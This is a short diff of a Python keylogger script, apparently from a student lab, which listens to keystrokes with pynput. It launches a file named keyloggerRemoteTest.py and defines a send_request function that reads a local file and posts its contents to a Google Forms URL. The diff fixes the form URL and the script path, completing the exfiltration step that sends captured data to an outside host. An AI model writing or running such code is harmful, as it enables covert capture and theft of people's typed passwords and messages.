@@ -7,13 +7,13 @@ from pynput.keyboard import Listener
 
 startlog = time.time()
 
-os.system("python3 /home/student/Desktop/scripts")
+os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py")
 time.sleep(1)
 
 def send_request():
         form_input = open("/home/student/Desktop/scripts")
         form_send = form_input.read()
-        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0>
+        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0'
         form_data = {'entry.2005620554': f"'{form_send}'"}
         r = requests.post(url, data=form_data)
 
@@ -30,3 +30,4 @@ while True:
         print(counter)
         interval()
         time.sleep(1)
+
